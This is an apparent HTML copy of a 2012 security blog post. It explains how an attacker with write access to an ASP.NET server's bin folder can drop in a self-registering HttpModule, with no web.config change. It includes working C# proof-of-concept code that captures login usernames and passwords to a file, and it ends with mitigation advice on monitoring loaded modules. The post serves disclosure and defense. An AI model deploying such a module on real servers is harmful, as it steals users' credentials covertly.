<!doctype html><html lang=en dir=auto data-theme=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=8322&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HttpModules. Now even easier to be misused. | Bruno Garcia</title><meta name=keywords content="C#,ASP.NET"><meta name=description content="How ASP.NET HttpModules can be exploited by attackers to intercept requests, steal credentials, and compromise web applications."><meta name=author content="Bruno Garcia"><link rel=canonical href=http://localhost:8322/posts/2012/httpmodules-now-even-easier-to-be/><link crossorigin=anonymous href=/assets/css/stylesheet.da3211e5ef867bf2b75fd5a6515cfed7195c011e8ab735694e203810a827097b.css integrity="sha256-2jIR5e+Ge/K3X9WmUVz+1xlcAR6KtzVpTiA4EKgnCXs=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:8322/favicon.ico><link rel=icon type=image/png sizes=16x16 href=http://localhost:8322/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=http://localhost:8322/favicon-32x32.png><link rel=apple-touch-icon href=http://localhost:8322/apple-touch-icon.png><link rel=mask-icon href=http://localhost:8322/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:8322/posts/2012/httpmodules-now-even-easier-to-be/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51);color-scheme:dark}.list{background:var(--theme)}.toc{background:var(--entry)}}@media(prefers-color-scheme:light){.list::-webkit-scrollbar-thumb{border-color:var(--code-bg)}}</style></noscript><script>localStorage.getItem("pref-theme")==="dark"?document.querySelector("html").dataset.theme="dark":localStorage.getItem("pref-theme")==="light"?document.querySelector("html").dataset.theme="light":window.matchMedia("(prefers-color-scheme: dark)").matches?document.querySelector("html").dataset.theme="dark":document.querySelector("html").dataset.theme="light"</script><link href=http://localhost:8322/css/custom.min.94d61a4faa677b041a8c9b05ce33e529d1a58a009e5c79583e31ec6b7e2cd50b.css integrity="sha256-lNYaT6pnewQajJsFzjPlKdGligCeXHlYPjHsa34s1Qs=" rel="preload stylesheet" as=style><script src=https://browser.sentry-cdn.com/10.39.0/bundle.tracing.min.js crossorigin=anonymous></script><script>Sentry.init({dsn:"https://88e8d79d263e44f0b6e3c3745244ce9c@o117736.ingest.sentry.io/5778766",integrations:[Sentry.browserTracingIntegration()],tracesSampleRate:1})</script><meta property="og:url" content="http://localhost:8322/posts/2012/httpmodules-now-even-easier-to-be/"><meta property="og:site_name" content="Bruno Garcia"><meta property="og:title" content="HttpModules. Now even easier to be misused."><meta property="og:description" content="How ASP.NET HttpModules can be exploited by attackers to intercept requests, steal credentials, and compromise web applications."><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2012-02-22T11:34:00+01:00"><meta property="article:modified_time" content="2012-02-22T11:34:00+01:00"><meta property="article:tag" content="C#"><meta property="article:tag" content="ASP.NET"><meta property="og:image" content="http://localhost:8322/posts/2012/httpmodules-now-even-easier-to-be/ModulePoC.PNG"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://localhost:8322/posts/2012/httpmodules-now-even-easier-to-be/ModulePoC.PNG"><meta name=twitter:title content="HttpModules. Now even easier to be misused."><meta name=twitter:description content="How ASP.NET HttpModules can be exploited by attackers to intercept requests, steal credentials, and compromise web applications."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://localhost:8322/posts/"},{"@type":"ListItem","position":2,"name":"HttpModules. Now even easier to be misused.","item":"http://localhost:8322/posts/2012/httpmodules-now-even-easier-to-be/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HttpModules. Now even easier to be misused.","name":"HttpModules. Now even easier to be misused.","description":"How ASP.NET HttpModules can be exploited by attackers to intercept requests, steal credentials, and compromise web applications.","keywords":["C#","ASP.NET"],"articleBody":"Attacks like DDoS or simple web defaces are just vandalism and for sure quite annoying. However, what is considered to be a serious threat is when skilled attackers target one application (or one company), looking for specific information. They dig until they find a security hole, escalate privileges and once they have access to one server, they begin to obtain access to other computer systems within that network.\nWhat does it have to do with HttpModules?\nHttpModules gives you a complete control over the Request, Response, Session, Cache and other modules loaded within your web application. They are required and very useful when building ASP.NET applications.\nThis great control over the application can also be misused when malicious attackers break into the Web Application Server. All the applications hosted there are compromised. Access to its ConnectionStrings means database access, and in case authentication is based on forms, all password hashes are readable. Bruteforcing against a dictionary or even using a hash database, like this one with over 10 million hashes, would break many of them. But with the control HttpModules gives to you is so big that you actually should not worry about hash cracking at all.\nHttpModule Overview The classic way to build an HttpModule is to create a class within your Web Application project (or at least reference System.Web), implement IHttpModule interface, create an entry to the web.config, and it works. The registration of the HttpModule is the portion added to the web.config, like:\n","wordCount":"1137","inLanguage":"en","image":"http://localhost:8322/posts/2012/httpmodules-now-even-easier-to-be/ModulePoC.PNG","datePublished":"2012-02-22T11:34:00.003+01:00","dateModified":"2012-02-22T11:34:00.003+01:00","author":{"@type":"Person","name":"Bruno Garcia"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8322/posts/2012/httpmodules-now-even-easier-to-be/"},"publisher":{"@type":"Person","name":"Bruno Garcia","logo":{"@type":"ImageObject","url":"http://localhost:8322/favicon.ico"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=http://localhost:8322/ accesskey=h title="Bruno Garcia (Alt + H)">Bruno Garcia</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:8322/projects/ title=Projects><span>Projects</span></a></li><li><a href=http://localhost:8322/about/ title=About><span>About</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">HttpModules. Now even easier to be misused.</h1><div class=post-description>How ASP.NET HttpModules can be exploited by attackers to intercept requests, steal credentials, and compromise web applications.</div><div class=post-meta><span title='2012-02-22 11:34:00.003 +0100 +0100'>February 22, 2012</span>&nbsp;·&nbsp;<span>6 min</span>&nbsp;·&nbsp;<span>Bruno Garcia</span></div></header><figure class="entry-cover cover-small"><img loading=eager srcset='http://localhost:8322/posts/2012/httpmodules-now-even-easier-to-be/ModulePoC.PNG 320w' src=http://localhost:8322/posts/2012/httpmodules-now-even-easier-to-be/ModulePoC.PNG sizes="(min-width: 768px) 720px, 100vw" width=320 height=218 alt></figure><div class=post-content><p>Attacks like DDoS or simple web defaces are just vandalism and for sure quite annoying. However, what is considered to be a serious threat is when skilled attackers target one application (or one company), looking for specific information. They dig until they find a security hole, escalate privileges and once they have access to one server, they begin to obtain access to other computer systems within that network.</p><p>What does it have to do with HttpModules?</p><p>HttpModules gives you a complete control over the Request, Response, Session, Cache and other modules loaded within your web application. They are required and very useful when building ASP.NET applications.</p><p>This great control over the application can also be misused when malicious attackers break into the Web Application Server. All the applications hosted there are compromised. Access to its ConnectionStrings means database access, and in case authentication is based on forms, all password hashes are readable. Bruteforcing against a dictionary or even using a hash database, like <a href=https://web.archive.org/web/20250112235743/http://hash-database.net/>this one</a> with over 10 million hashes, would break many of them. But with the control HttpModules gives to you is so big that you actually should not worry about hash cracking at all.</p><h2 id=httpmodule-overview>HttpModule Overview<a hidden class=anchor aria-hidden=true href=#httpmodule-overview>#</a></h2><p>The classic way to build an HttpModule is to create a class within your Web Application project (or at least reference System.Web), implement <code>IHttpModule</code> interface, create an entry to the web.config, and it works. The registration of the HttpModule is the portion added to the web.config, like:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#ff79c6>&lt;httpModules&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;add</span> <span style=color:#50fa7b>name=</span><span style=color:#f1fa8c>&#34;AuditModule&#34;</span> <span style=color:#50fa7b>type=</span><span style=color:#f1fa8c>&#34;BrunoGarcia.AuditModule&#34;</span><span style=color:#ff79c6>/&gt;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>&lt;/httpModules&gt;</span>
</span></span></code></pre></div><p>HttpModules can easily be plugged in an application in production without rebuilding it or having any access to the source control what so ever. Simply adding the module dll under the bin folder or just putting HttpModule source file in <code>App_Code</code> folder which would trigger dynamic compilation and recycle the application. <strong>But the web.config registration would have to be done either way.</strong></p><p>With the introduction of ASP.NET MVC 3, came along the <code>Microsoft.Web.Infrastructure</code> assembly. Microsoft has its description on <a href="http://msdn.microsoft.com/en-us/library/microsoft.web.infrastructure%28v=vs.99%29.aspx">msdn</a>:</p><blockquote><p>The <code>Microsoft.Web.Infrastructure.DynamicModuleHelper</code> contains classes that assist in managing dynamic modules in ASP.NET web pages that use the Razor syntax.</p></blockquote><p>One of the classes within that namespace is: <a href=http://msdn.microsoft.com/en-us/library/system.web.preapplicationstartmethodattribute.aspx>PreApplicationStartMethodAttribute</a> that can be used to make the module registration programmatically. Note that even though it mentions &ldquo;Razor syntax&rdquo;, what I describe here works with any type of ASP.NET application.</p><p>With this, it got even easier, considering the module will register itself. Just make sure the application server has the <code>Microsoft.Web.Infrastructure.dll</code> available either in the global assembly catalog (GAC) or at least under the application Bin folder and the application pool running on .Net 4.0. <a href=http://www.mattwrock.com/>Matt Wrock</a> wrote <a href=https://web.archive.org/web/20250821032403/https://code.msdn.microsoft.com/Installing-an-HttpModule-27d7c6e1>here</a>, not long ago, about this new functionality and he ends the post with the section &ldquo;Is this a good practice?&rdquo; describing a few concerns about this technique. I&rsquo;d like to quote this part:</p><blockquote><p><em>&ldquo;Well maybe I&rsquo;m over thinking this but my first concern here is <strong>discoverability</strong>. In the case of this specific sample, the HttpModule is visibly changing the markup rendered to the browser. I envision a new developer or team inheriting this application and wonder just how long it will take for them to find where this &ldquo;alteration&rdquo; is coming from. &mldr; Or perhaps a team member drops in such a module and forgets to tell the team she put it there. I&rsquo;m thinking that at some point in this story some negative energy will be exerted. Perhaps even a tear shed?&rdquo;</em></p></blockquote><p>Now an attacker with write permission to the application bin folder can inject a module without even changing the web.config, and therefore make it even more complicated to detect the system was compromised.</p><h2 id=poc>PoC<a hidden class=anchor aria-hidden=true href=#poc>#</a></h2><p>To simulate the production system I&rsquo;ve created a new project using ASP.NET Web Application template that creates a standard Web Forms Project, did no changes to the project, built it and hosted with IIS 7.5.
Created an entry to the loopback on <code>C:\Windows\System32\drivers\etc\hosts</code> called: httpmodulepoc.com</p><p>Note that IIS has default settings and the Application Pool is running under ApplicationPoolIdentity and as mentioned <a href=http://support.microsoft.com/kb/2005172>here</a>, is:</p><blockquote><p><em>ApplicationPoolIdentity is a Managed Service Account, which is a new concept introduced in Windows Server 2008 R2 and Windows 7.</em></p></blockquote><p>For this PoC I thought of simply intercepting all requests, and in case of a POST on the login form, write the username and password to a file. Writing a file on disk with the permission set that Application Pool has by default doesn&rsquo;t give you many options. However the ACL on ASP.NET Temp folder allows write access.</p><p>Therefore I picked the path:</p><p><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files</code></p><p>Then comes the module:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-csharp data-lang=csharp><span style=display:flex><span><span style=color:#ff79c6>using</span> System;
</span></span><span style=display:flex><span><span style=color:#ff79c6>using</span> System.IO;
</span></span><span style=display:flex><span><span style=color:#ff79c6>using</span> System.Web;
</span></span><span style=display:flex><span><span style=color:#ff79c6>using</span> System.Web.Hosting;
</span></span><span style=display:flex><span><span style=color:#ff79c6>using</span> Microsoft.Web.Infrastructure.DynamicModuleHelper;
</span></span><span style=display:flex><span><span style=color:#50fa7b>
</span></span></span><span style=display:flex><span><span style=color:#50fa7b>[assembly: PreApplicationStartMethod(typeof(RequestInterceptorModule), &#34;Run&#34;)]</span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#ff79c6>class</span> <span style=color:#50fa7b>RequestInterceptorModule</span> : IHttpModule
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>static</span> <span style=color:#ff79c6>void</span> Run()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        DynamicModuleUtility.RegisterModule(<span style=color:#ff79c6>typeof</span>(RequestInterceptorModule));
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#ff79c6>void</span> Dispose() { }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>const</span> <span style=color:#8be9fd>string</span> myFile = <span style=color:#f1fa8c>@&#34;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\HttpModulePoC&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>static</span> <span style=color:#ff79c6>readonly</span> <span style=color:#8be9fd>object</span> @lock = <span style=color:#ff79c6>new</span> <span style=color:#8be9fd>object</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#ff79c6>void</span> Init(HttpApplication context)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        context.BeginRequest += <span style=color:#ff79c6>new</span> EventHandler(context_BeginRequest);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        File.WriteAllText(myFile,
</span></span><span style=display:flex><span>            <span style=color:#8be9fd>string</span>.Format(<span style=color:#f1fa8c>&#34;{0} Module initialized for application {1}\r\n&#34;</span>,
</span></span><span style=display:flex><span>            DateTime.Now,
</span></span><span style=display:flex><span>            HostingEnvironment.ApplicationHost.GetSiteName()));
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>void</span> context_BeginRequest(<span style=color:#8be9fd>object</span> sender, EventArgs e)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#8be9fd>var</span> app = sender <span style=color:#ff79c6>as</span> HttpApplication;
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> (app.Request.RequestType == <span style=color:#f1fa8c>&#34;POST&#34;</span>
</span></span><span style=display:flex><span>            &amp;&amp; Path.GetFileName(app.Request.PhysicalPath) == <span style=color:#f1fa8c>&#34;Login.aspx&#34;</span>)
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>lock</span> (@lock)
</span></span><span style=display:flex><span>            {
</span></span><span style=display:flex><span>                File.AppendAllText(myFile, <span style=color:#8be9fd>string</span>.Format(<span style=color:#f1fa8c>&#34;{0} - Login: {1} - Password: {2}\r\n&#34;</span>,
</span></span><span style=display:flex><span>                    DateTime.Now,
</span></span><span style=display:flex><span>                    app.Request.Form[<span style=color:#f1fa8c>&#34;ctl00$MainContent$LoginUser$UserName&#34;</span>],
</span></span><span style=display:flex><span>                    app.Request.Form[<span style=color:#f1fa8c>&#34;ctl00$MainContent$LoginUser$Password&#34;</span>]));
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>I built this class in its own project. A dll file with 6KB was created and I just copied it to the hosted application HttpModulePoC bin folder.</p><p>Then I browse: httpmodulepoc.com</p><p>When I hit the server, the application pool process starts, the module loads itself, subscribes for BeginRequest event and writes to the file:</p><p><code>21/02/2012 16:32:45 Module initialized for application HttpModulePoC</code></p><p>Click on Login link, write username and password and click Log In:</p><p><img alt="HttpModule PoC" loading=lazy src=/posts/2012/httpmodules-now-even-easier-to-be/ModulePoC.PNG></p><p>In the file I see:</p><p><code>21/02/2012 16:32:58 - Login: myUsername - Password: myPassword</code></p><p>This is just an example of what could be done. Think of having complete access to Cache, User Session, Request, Response and more. So much can be done.</p><h2 id=monitoring-loaded-modules>Monitoring loaded modules<a hidden class=anchor aria-hidden=true href=#monitoring-loaded-modules>#</a></h2><p>As I mentioned above, before the introduction of <code>Microsoft.Web.Infrastructure.DynamicModuleHelper.PreApplicationStartMethodAttribute</code>, creating custom modules required registration on web.config. Simple monitoring the configuration files was enough. But now a different approach has to be used.</p><p>Before injecting my module to the HttpModulePoC application, enumerating the loaded Modules with:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-csharp data-lang=csharp><span style=display:flex><span>HttpContext.Current.ApplicationInstance.Modules.AllKeys
</span></span></code></pre></div><p>I got the following 15 items:</p><p>OutputCache, Session, WindowsAuthentication, FormsAuthentication, PassportAuthentication, RoleManager, UrlAuthorization, FileAuthorization, AnonymousIdentification, Profile, ErrorHandlerModule, ServiceModel, UrlRoutingModule-4.0, ScriptModule-4.0, DefaultAuthentication</p><p>Mitigation could be done by writing a custom code to compare the allowed modules with the ones loaded. In case an unauthorized module is loaded, send an alert (or avoid completely the application from starting). Alerts could be simply written to event log or sent by e-mail.</p><p>Obviously, the most important is to train the development team to write secure code, make sure the system is up-to-date with security updates from the vendor of the operating system and applications installed. That will minimize the risk of attackers breaking into the application server.</p></div><footer class=post-footer><ul class=post-tags><li><a href=http://localhost:8322/tags/c%23/>C#</a></li><li><a href=http://localhost:8322/tags/asp.net/>ASP.NET</a></li></ul></footer></article></main><footer class=footer><div class=footer-projects>hobby projects:
<a href=https://codereviewtrends.com target=_blank rel=noopener>Code Review Trends</a>
·
<a href=https://nugettrends.com target=_blank rel=noopener>NuGet Trends</a></div><span>&copy; 2026 <a href=https://github.com/bruno-garcia/blog target=_blank rel=noopener>Bruno Garcia</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");if(menu){const e=localStorage.getItem("menu-scroll-position");e&&(menu.scrollLeft=parseInt(e,10)),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}}document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{const e=document.querySelector("html");e.dataset.theme==="dark"?(e.dataset.theme="light",localStorage.setItem("pref-theme","light")):(e.dataset.theme="dark",localStorage.setItem("pref-theme","dark"))})</script></body></html>